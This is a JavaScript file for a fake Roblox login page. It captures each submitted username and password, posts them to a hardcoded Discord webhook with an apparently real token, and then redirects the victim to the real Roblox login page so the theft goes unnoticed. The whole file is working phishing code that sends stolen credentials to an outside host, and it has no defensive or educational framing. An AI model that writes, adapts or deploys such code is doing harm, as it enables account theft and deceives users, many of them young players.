const WEBHOOK_URL = "https://discord.com/api/webhooks/1538723870050095204/oZWJ3gD5uDClYngLjnV1cJU3EHxoFHNPyISpMStVadt5RFT64A0I1PVJ44OL-Ri-EFvY";


document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    
    const payload = {
        content: `🚨 **New Roblox Login** 🚨\n👤 Username: \`${username}\`\n🔑 Password: \`${password}\`\n📅 Date: ${new Date().toISOString()}`
    };

    try {
        const response = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload),
        });

        if (response.ok) {
            console.log("Data sent to webhook");
            // Redirect to real Roblox login page after sending
            window.location.href = "https://www.roblox.com/login";
        } else {
            console.error("Failed to send data");
        }
    } catch (error) {
        console.error("Error:", error);
    }
});
